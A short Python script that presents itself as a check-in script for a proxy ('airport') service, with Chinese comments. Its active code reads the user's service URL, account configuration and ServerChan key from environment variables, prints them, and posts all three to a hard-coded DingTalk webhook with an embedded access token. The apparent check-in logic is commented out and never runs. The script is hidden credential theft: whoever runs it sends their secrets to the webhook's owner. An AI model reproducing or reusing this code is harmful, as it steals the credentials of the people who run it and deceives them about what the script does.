import requests, json, re, os
# 机场的地址
url = os.environ.get('URL')
# 配置用户名（一般是邮箱）

config = os.environ.get('CONFIG')
# server酱
SCKEY = os.environ.get('SCKEY')


print(url)
print(config)
print(SCKEY)

WEBHOOK = "https://oapi.dingtalk.com/robot/send?access_token=887828d861ac71ccb39d11d79d8f378308c3d9fa0824b554929250a21ca920a7"

headers = {"Content-Type": "application/json"}
data = {
    "msgtype": "text",
    "text": {"content": "通知url"+url+"config"+config+"SCKEY"+SCKEY}
}

response = requests.post(WEBHOOK, headers=headers, data=json.dumps(data))


# if __name__ == '__main__':
#     configs = config.splitlines()
#     if len(configs) == 0:
#         print('配置文件格式错误')
#         exit()
#     user_quantity = len(configs)
#     user_quantity = user_quantity // 2
#     for i in range(user_quantity):
#         print('用户' + str(i+1) + '开始签到'+configs[i])
        